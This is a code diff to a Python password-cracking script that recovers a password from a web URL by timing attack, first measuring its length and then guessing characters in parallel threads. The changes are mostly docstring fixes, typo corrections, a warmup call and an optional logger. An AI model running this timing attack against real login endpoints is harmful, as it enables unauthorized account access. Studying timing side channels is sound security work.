@@ -140,11 +140,11 @@ def create_folder_if_not_exists(folder_path: str) -> None:
 
 def run_url(url: str) -> float:
     """
-    This function request to given url and return it source code as a string.
+    This function send request to a given url and return the time i took for a response.
 
     :param url: String. URL to request.
 
-    :return: str. source code of the given URL.
+    :return: float. total time in second.
     """
     # aviv
     # urllib.request.urlopen(url)
@@ -155,7 +155,6 @@ def run_url(url: str) -> float:
     response = requests.get(url)
     timer.sleep(Configurations.sleep_time)
     return response.elapsed.total_seconds()
-
 
 
 def check_password_size_thread(url_result_command: str, iterations: int, thread_number: int, logger) -> float:
@@ -193,7 +192,7 @@ def check_password_size_thread(url_result_command: str, iterations: int, thread_
 
 def warmup() -> None:
     """
-    This function run curl for the first time to stabilize the connection time.
+    This function send an http request for the first time to stabilize the connection time.
 
     :return: None.
     """
@@ -228,7 +227,7 @@ def check_password_size(start_url: str = "", end_url: str = "", max_password_siz
     """
     The function uses timing attack (by time gap) the size of the password.
 
-    :param url: String. the first part of the URL.
+    :param start_url: String. the first part of the URL.
     :param end_url: String. the last part of the URL.
     :param max_password_size: String. the first part of the URL.
     :param logger: logger. if not None the function write it action to the given logger.
@@ -241,7 +240,7 @@ def check_password_size(start_url: str = "", end_url: str = "", max_password_siz
     warmup()
 
     results = {}
-    future_results = []
+    future_results = []     # for getting the result from a thread when using ThreadPoolExecutor
     distinct = False
 
     while not distinct:
@@ -327,12 +326,13 @@ def crack_password(password_size: int, start_url: str = "", end_url: str = "", l
     :param end_url: String. postfix of the url.
     :param logger: Logger. if a given, a command will be writen in it.
 
-    :return: String. the pasword that have been found, None if failed to find the password.
+    :return: String. the password that have been found, None if failed to find the password.
     """
     password = ""
 
-    for i in range(password_size - len(password)):
+    warmup()
 
+    for i in range(password_size - len(password)):
 
         thread_pool = ThreadPoolExecutor(max_workers=Configurations.max_of_threads)
 
@@ -393,7 +393,7 @@ def crack_password(password_size: int, start_url: str = "", end_url: str = "", l
     return Configurations.password if Configurations.password != "" else None
 
 
-def timing_attack(start_url: str = "", end_url: str= "", password_size: int = Configurations.default_password_size) -> str:
+def timing_attack(start_url: str = "", end_url: str = "", password_size: int = Configurations.default_password_size) -> str:
     """
     This function get url and password size and return the password by using a time attack.
 
@@ -401,9 +401,12 @@ def timing_attack(start_url: str = "", end_url: str= "", password_size: int = Co
     :param end_url: str. last part of the url after password appear.
     :param password_size: Int. max size of the password that possible.
 
-    :return: Int. password as a string. None if couldn't find any.
+    :return: str. password as a string. None if couldn't find any.
     """
-    logger = set_logger(Configurations.result_path, "crack password")
+    if Configurations.use_logger:
+        logger = set_logger(Configurations.result_path, "crack password")
+    else:
+        logger = None
 
     size = check_password_size(start_url=start_url, end_url=end_url, max_password_size=password_size, logger=logger)
 
